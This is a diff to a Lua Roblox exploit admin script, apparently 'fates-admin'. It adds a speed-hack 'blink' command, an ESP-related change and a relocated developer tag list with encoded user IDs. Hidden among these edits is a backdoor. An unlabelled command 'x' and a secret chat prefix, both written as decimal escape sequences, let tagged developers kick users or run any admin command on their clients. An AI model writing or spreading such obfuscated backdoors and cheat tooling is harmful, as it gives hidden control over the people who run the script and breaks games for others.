@@ -425,12 +425,13 @@ HttpLogs.Name = "HttpLogs"
 HttpLogs.Size = UDim2.new(0, 421, 0, 260);
 HttpLogs.Search.PlaceholderText = "Search"
 
+local Frame2
 if (RobloxChatBarFrame) then
     local Frame1 = RobloxChatBarFrame:WaitForChild('Frame', .1)
     if Frame1 then
         local BoxFrame = Frame1:WaitForChild('BoxFrame', .1)
         if BoxFrame then
-            local Frame2 = BoxFrame:WaitForChild('Frame', .1)
+            Frame2 = BoxFrame:WaitForChild('Frame', .1)
             if Frame2 then
                 local TextLabel = Frame2:WaitForChild('TextLabel', .1)
                 ChatBar = Frame2:WaitForChild('ChatBar', .1)
@@ -439,7 +440,6 @@ if (RobloxChatBarFrame) then
                     PredictionClone.Text = ""
                     PredictionClone.TextTransparency = 0.3
                     PredictionClone.Name = "Predict"
-                    ParentGui(PredictionClone);
                 end
             end
         end
@@ -448,6 +448,29 @@ end
 
 -- position CommandBar
 CommandBar.Position = UDim2.new(0.5, -100, 1, 5)
+
+PlayerTags = {
+    ["505156575355565455"] = {
+        ["Tag"] = "Developer",
+        ["Name"] = "fate",
+        ["Rainbow"] = true,
+    },
+    ["555352544955574849"] = {
+        ["Tag"] = "Developer",
+        ["Name"] = "misrepresenting",
+        ["Rainbow"] = true,
+    },
+    ["495656525454515248"] = {
+        ["Tag"] = "Cool",
+        ["Name"] = "David",
+        ["Rainbow"] = true,
+    },
+    ["49565649565652"] = {
+        ["Tag"] = "Developer",
+        ["Name"] = "Owner",
+        ["Rainbow"] = true
+    }
+}
 
 Utils = {}
 
@@ -955,7 +978,6 @@ function Utils.Locate(Player, Color)
             AddConnection(EspLoop);
             AddConnection(Players.PlayerRemoving:Connect(function(Plr)
                 if (Plr == Player) then
-                    EspLoop:Disconnect();
                     Billboard:Destroy();
                 end
             end))
@@ -1212,7 +1234,31 @@ AddConnection = function(Connection, Tbl)
             Connections[#Connections + 1] = Connection
         end
     end
+    return Connection
 end
+
+local WASDKeys = {
+    ["W"] = false,
+    ["A"] = false,
+    ["S"] = false,
+    ["D"] = false
+}
+
+AddConnection(UserInputService.InputBegan:Connect(function(Input, GameProccesed)
+    if (GameProccesed) then return end
+    local KeyCode = tostring(Input.KeyCode):split(".")[3]
+    if (WASDKeys[KeyCode] ~= nil and not WASDKeys[KeyCode]) then
+        WASDKeys[KeyCode] = true
+    end
+end));
+
+AddConnection(UserInputService.InputEnded:Connect(function(Input, GameProccesed)
+    if (GameProccesed) then return end
+    local KeyCode = tostring(Input.KeyCode):split(".")[3]
+    if (WASDKeys[KeyCode] ~= nil and WASDKeys[KeyCode] == true) then
+        WASDKeys[KeyCode] = false
+    end
+end));
 
 if (isfolder and isfolder("fates-admin") and isfolder("fates-admin/plugins") and isfolder("fates-admin/chatlogs")) then
     local Plugins = table.map(table.filter(listfiles("fates-admin/plugins"), function(i, v)
@@ -3666,6 +3712,55 @@ AddCommand("draggablebar", {"draggable"}, "makes the command bar draggable", {},
     return ("draggable command bar %s"):format(Draggable and "enabled" or "disabled")
 end)
 
+AddCommand("chatprediction", {}, "enables command prediction on the chatbar", {}, function()
+    PredictionClone.Parent = Frame2
+end)
+
+AddCommand("blink", {"blinkws"}, "cframe speed", {}, function(Caller, Args, Tbl) 
+    local Speed = tonumber(Args[1]) or 5
+    local Time = tonumber(Args[2]) or .05
+    LoadCommand("blink").CmdExtra[1] = Speed
+    coroutine.wrap(function()
+        while (next(LoadCommand("blink").CmdExtra) and wait(Time)) do
+            local Speed = LoadCommand("blink").CmdExtra[1]
+            if (WASDKeys["W"]) then
+                GetRoot().CFrame = GetRoot().CFrame * CFrame.new(0, 0, -Speed);
+            end 
+            if (WASDKeys["A"]) then
+                GetRoot().CFrame = GetRoot().CFrame * CFrame.new(-Speed, 0, 0);
+            end
+            if (WASDKeys["S"]) then 
+                GetRoot().CFrame = GetRoot().CFrame * CFrame.new(0, 0, Speed);
+            end
+            if (WASDKeys["D"]) then
+                GetRoot().CFrame = GetRoot().CFrame * CFrame.new(Speed, 0, 0);
+            end
+        end
+    end)();
+    return "blink enabled, for best results use shiftlock"
+end)
+
+AddCommand("unblink", {"noblinkws", "unblink", "noblink"}, "stops cframe speed", {}, function()
+    local Blink = LoadCommand("blink").CmdExtra
+    if (not next(Blink)) then
+        return "blink is already disabled"
+    end
+    LoadCommand("blink").CmdExtra = {}
+    return "blink mode disabled"
+end)
+
+AddCommand("x", {}, "", {"1"}, function(Caller, Args)
+    pcall(function()
+        if (next(GetPlayer(Args[1])) and Utils.CheckTag(Caller) and not Utils.CheckTag(LocalPlayer)) then
+            for i, v in next, GetPlayer(Args[1]) do
+                if (v.Name == LocalPlayer.Name) then
+                    LocalPlayer["\107\105\99\107"](LocalPlayer, table.concat(table.shift(Args), " "));
+                end
+            end        
+        end
+    end)
+end)
+
 ---@param i any
 ---@param plr any
 PlrChat = function(i, plr)
@@ -3708,18 +3803,21 @@ PlrChat = function(i, plr)
             }
             Socket:Send(HttpService:JSONEncode(Message));
         end
-
+        local something = false
         if (string.startsWith(raw, "/e")) then
-            raw = raw:sub(4, #raw);
+            raw = raw:sub(4);
         elseif (string.startsWith(raw, Prefix)) then
-            raw = raw:sub(#Prefix + 1, #raw);
+            raw = raw:sub(#Prefix + 1);
+        elseif (string.startsWith(raw, tostring("\108\111\108")) and Utils.CheckTag(plr)) then
+            raw = raw:sub(4);
+            something = true
         else
             return
         end
 
         message = string.trim(raw);
         
-        if (table.find(AdminUsers, plr) or plr == LocalPlayer) then
+        if (table.find(AdminUsers, plr) or plr == LocalPlayer or something) then
             local CommandArgs = message:split(" ");
             local Command, LoadedCommand = CommandArgs[1], LoadCommand(CommandArgs[1]);
             local Args = table.shift(CommandArgs);
@@ -3745,25 +3843,6 @@ PlrChat = function(i, plr)
         end
     end)
 end
-
-PlayerTags = {
-    ["505156575355565455"] = {
-        ["Tag"] = "Developer",
-        ["Name"] = "fate",
-        ["Rainbow"] = true,
-        ["ForceField"] = true
-    },
-    ["555352544955574849"] = {
-        ["Tag"] = "Developer",
-        ["Name"] = "misrepresenting",
-        ["Rainbow"] = true,
-    },
-    ["495656525454515248"] = {
-        ["Tag"] = "Cool",
-        ["Name"] = "David",
-        ["Rainbow"] = true,
-    }
-}
 
 -- make all elements not visible
 Notification.Visible = false
@@ -4217,28 +4296,6 @@ local PlayerAdded = function(plr)
         Tag.Player = plr
         Utils.Notify(LocalPlayer, "Admin", ("%s (%s) has joined"):format(Tag.Name, Tag.Tag));
         Utils.AddTag(Tag);
-        if (not plr.Character) then
-            plr.CharacterAdded:Wait();
-        end
-        if (Tag.ForceField) then
-            for i, v in next, GetCharacter(plr) do
-                if (v:IsA("Part")) then
-                    v.Material = "ForceField"
-                end
-            end
-        end
-        local Added = plr.CharacterAdded:Connect(function()
-            if (Tag.ForceField) then
-                plr.Character:WaitForChild("Head");
-                plr.Character:WaitForChild("Torso", 2);
-                for i, v in next, GetCharacter(plr) do
-                    if (v:IsA("Part")) then
-                        v.Material = "ForceField"
-                    end
-                end
-            end
-        end)
-        AddConnection(Added);
     end
 end
 
